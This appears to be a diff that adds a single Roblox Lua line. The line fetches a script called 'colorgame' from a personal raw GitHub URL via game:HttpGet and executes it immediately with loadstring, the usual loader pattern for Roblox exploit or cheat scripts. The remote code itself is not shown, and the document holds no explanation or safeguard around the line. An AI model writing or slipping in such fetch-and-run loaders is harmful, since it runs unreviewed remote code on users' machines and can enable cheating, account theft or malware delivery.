@@ -1,0 +1,2 @@
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ttttttt55/my-script/refs/heads/main/colorgame"))()
